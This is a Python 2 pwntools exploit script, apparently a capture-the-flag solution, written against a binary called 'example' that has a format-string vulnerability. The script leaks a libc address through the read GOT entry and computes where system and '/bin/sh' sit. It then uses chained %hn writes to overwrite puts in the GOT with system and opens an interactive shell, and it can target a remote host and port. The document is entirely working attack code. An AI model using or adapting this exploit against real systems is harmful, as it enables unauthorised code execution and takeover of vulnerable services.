#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 1
arch_64 = 1
exe = "./example"

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)
if debug:
    context.log_level = "debug"

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
    libc = ELF("./libc.so.6")
else:
    p = process([exe])
    if arch_64:
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        arena = 0x3c4b20
        context.arch = "amd64"
    else:
        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
        arena = 0x1b2780
        context.arch = "i386"

def z():
    gdb.attach(p)

puts_got = e.got["puts"]
read_got = e.got["read"]

p1 = "%9$s".ljust(8,'c')+p64(read_got)
sl(p1)
sl("")

read_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
print "read : "+hex(read_addr)
libc.address = read_addr - libc.symbols["read"]
system = libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next()

#lsys = system & 0xffff
offset = 8
# change quit => /bin/sh

sl("%lx")

print p.recv(10)
sh_addr = int("0x"+p.recv(12),16)-8

print "sh_addr: "+hex(sh_addr)
print "system: "+hex(system)
z()

def write(number,addr,offset):
    tmp_addr = addr
    for i in range(3):
        print hex(number/pow(0x10000,i) & 0xffff)
        p5 = "%{}c%{}$hn".format( number/pow(0x10000,i) & 0xffff,offset).ljust(24,'a')+p64(tmp_addr)
        sd(p5)
        tmp_addr+=2

write(system,puts_got,11)
write(bin_sh,sh_addr,11)
sl("quit")

'''
p2 = "%{}c%{}$hn".format(system & 0xffff,offset).ljust(16,'c')+p64(puts_got)
sl(p2)

p3 = "%{}c%{}$hn".format(system/0x10000 & 0xffff,offset).ljust(16,'c')+p64(puts_got+2)
sl(p3)

p4 = "%{}c%{}$hn".format(system/pow(0x10000,2) & 0xffff,offset).ljust(16,'c')+p64(puts_got+4)
sl(p4)
'''

p.interactive()



